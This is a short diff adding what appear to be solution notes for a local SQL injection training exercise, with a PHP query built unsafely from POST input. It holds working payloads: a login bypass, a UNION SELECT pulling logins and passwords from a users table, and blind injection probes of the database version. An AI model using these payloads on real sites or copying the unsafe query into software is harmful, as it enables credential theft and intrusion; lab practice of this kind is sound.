@@ -1,0 +1,17 @@
+1) 
+$sql  = "SELECT login, password FROM users WHERE login = '${_POST['login']}' AND password = SHA1('${_POST['password']}')";
+
+' OR 1 = 1;--  // пробел в конце!
+whatever
+
+
+2) 
+http://localhost:8081/cases/2/?month=-1 union all select login, password, null, null, null from users;--
+
+3) 
+http://localhost:8081/cases/3/?id=1 AND SUBSTR(@@version, 1, 1) = 5
+
+6)
+if (SUBSTR(@@version, 1, 1) = 5, title, year)
+or
+case when (SUBSTR(@@version, 1, 1) = 5) then title end
